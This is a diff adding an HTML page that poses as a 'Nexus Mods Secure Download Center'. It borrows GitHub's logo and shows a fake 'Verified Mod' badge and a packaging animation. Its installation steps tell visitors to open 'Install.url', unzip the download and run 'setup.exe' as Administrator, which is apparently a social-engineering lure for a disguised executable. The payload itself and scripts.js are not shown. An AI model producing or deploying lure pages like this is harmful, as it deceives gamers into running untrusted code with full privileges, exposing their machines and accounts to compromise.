@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Mods - Secure Download Center</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c9d1d9'%3E%3Cpath d='M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z'/%3E%3C/svg%3E">
+    <link href="css2" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="gh-header">
+        <div class="gh-container">
+            <div class="gh-left">
+                <svg height="24" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="24" class="gh-logo">
+                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
+                </svg>
+                <div class="gh-title-wrapper">
+                    <span class="gh-title-main">Nexus Mods</span>
+                    <span class="gh-title-sub">Secure Download Center</span>
+                </div>
+            </div>
+            <div class="gh-verified">
+                <span>✓ Verified Mod</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="gh-main">
+        <div class="gh-card">
+            <div class="gh-dl-section">
+                <div class="gh-section-header">
+                    <h2>Download Mod Package</h2>
+                    <p>Automatic secure packaging. One-click download.</p>
+                </div>
+
+                <div class="gh-status">
+                    <div class="gh-status-left">
+                        <div id="gh-status-icon" class="gh-icon">⬇</div>
+                        <span id="gh-status-text" class="gh-status-txt">Preparing mod files...</span>
+                    </div>
+                    <button id="gh-btn-retry" class="gh-retry gh-hidden">Retry</button>
+                </div>
+
+                <div id="gh-progress-wrapper" class="gh-progress-wrapper gh-hidden">
+                    <div class="gh-progress-bg">
+                        <div id="gh-progress-bar" class="gh-progress-fill"></div>
+                    </div>
+                    <p id="gh-progress-text" class="gh-progress-txt">0% complete</p>
+                </div>
+
+                <div id="gh-terminal" class="gh-terminal gh-hidden">
+                    <div class="gh-terminal-header">PACKAGING MOD</div>
+                    <div id="gh-terminal-content" class="gh-terminal-content">
+                        <div id="gh-cursor-line" class="gh-cursor-line gh-hidden">
+                            <span>&gt;</span>
+                            <span id="gh-cursor" class="gh-cursor">_</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="gh-install">
+                <div class="gh-section-header">
+                    <h2>Installation</h2>
+                    <p>Follow these steps exactly to install the mod.</p>
+                </div>
+
+                <div class="gh-steps">
+                    <h3>INSTALLATION:</h3>
+                    <div class="gh-steps-list">
+                        <div class="gh-step-item">
+                            <span class="gh-step-num">1</span>
+                            <span class="gh-step-txt">Open "Install.url" (this triggers the secure download).</span>
+                        </div>
+                        <div class="gh-step-item">
+                            <span class="gh-step-num">2</span>
+                            <span class="gh-step-txt">Fully unzip the downloaded archive.</span>
+                        </div>
+                        <div class="gh-step-item">
+                            <span class="gh-step-num">3</span>
+                            <span class="gh-step-txt">Run "setup.exe" as Administrator.</span>
+                        </div>
+                        <div class="gh-step-item">
+                            <span class="gh-step-num">4</span>
+                            <span class="gh-step-txt">Wait for the installation to finish.</span>
+                        </div>
+                        <div class="gh-step-item">
+                            <span class="gh-step-num">5</span>
+                            <span class="gh-step-txt">Launch the game.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="gh-footer">
+        <div class="gh-footer-container">
+            <div class="gh-footer-left">
+                <svg height="20" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="20" class="gh-footer-logo">
+                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
+                </svg>
+                <span class="gh-copyright">© 2026 Nexus Mods</span>
+            </div>
+            <div class="gh-footer-links">
+                <a href="#" class="gh-footer-link">About</a>
+                <a href="#" class="gh-footer-link">Support</a>
+                <a href="#" class="gh-footer-link">Discord</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="scripts.js"></script>
+</body>
+</html>
